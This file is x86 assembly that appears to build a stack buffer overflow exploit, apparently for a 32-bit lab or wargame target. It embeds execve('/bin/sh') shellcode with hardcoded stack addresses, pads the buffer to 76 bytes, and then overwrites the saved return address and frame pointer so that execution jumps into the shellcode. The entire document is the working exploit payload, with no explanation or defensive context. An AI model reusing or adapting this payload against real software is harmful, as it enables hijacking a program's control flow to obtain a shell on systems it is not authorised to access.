        .intel_syntax noprefix

        .set binsh,      0xb7f8cc58
        .set NULL,       0x00000000
        .set SYS_execve, 0xb
        .set frame_addr, 0xbffffe04
        .set saved_eip,  0xbffffe58
        .set saved_ebp,  0x804854a

        .section .rodata

payload_start:
        .asciz "/bin/sh"

        .int 0xbffffdfc
        .int 0x00000000

        mov eax, 0xb
        mov ebx, 0xbffffdfc
        mov ecx, 0xbffffe04
        mov edx, 0x00000000

        int 0x80

shellcode_end:
        .rept 76 - (shellcode_end - payload_start)
        .byte 0xff
        .endr

        .int saved_eip
        .int saved_ebp

        .rept 8
        .byte 0x41
        .endr

        .int 0xbffffdfc - 40
        .int 0xbffffdfc + 16
